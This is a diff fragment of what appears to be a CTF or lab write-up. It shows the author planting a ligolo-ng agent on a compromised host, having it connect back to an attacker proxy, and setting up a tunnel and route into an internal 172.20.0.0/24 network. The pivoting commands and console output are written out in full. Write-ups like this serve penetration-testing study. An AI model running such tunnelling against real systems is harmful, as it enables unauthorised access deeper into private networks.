@@ -485,8 +485,33 @@ Ill start by starting the proxy on my host
 Ill then transfer the agent to the target
 
 ```python
-
+spencer@ip-10-0-20-19:/tmp$ chmod +x agent 
+spencer@ip-10-0-20-19:/tmp$ ./agent -connect 10.200.105.173:11601 --retry --ignore-cert                      
+WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        addr="10.200.105.173:11601"
 ```
+
+Then ill trigger the connection on the target
+
+```python
+ligolo-ng » INFO[0249] Agent joined.                                 id=02ffd2b701c9 name=spencer@ip-10-0-20-19 remote="10.0.20.19:46766"
+ligolo-ng » 
+ligolo-ng » 
+ligolo-ng » session
+? Specify a session : 1 - spencer@ip-10-0-20-19 - 10.0.20.19:46766 - 02ffd2b701c9
+[Agent : spencer@ip-10-0-20-19] » 
+[Agent : spencer@ip-10-0-20-19] » 
+[Agent : spencer@ip-10-0-20-19] » ifcreate --name ligolo
+INFO[0266] Creating a new ligolo interface...           
+INFO[0266] Interface created!                           
+[Agent : spencer@ip-10-0-20-19] » route_add --name ligolo --route 172.20.0.0/24
+INFO[0317] Route created.                               
+[Agent : spencer@ip-10-0-20-19] » tunnel_start 
+INFO[0321] Starting tunnel to spencer@ip-10-0-20-19 (02ffd2b701c9) 
+[Agent : spencer@ip-10-0-20-19] » 
+```
+
+Then ill use the session create a new interface and add the routing info g
 
 
 
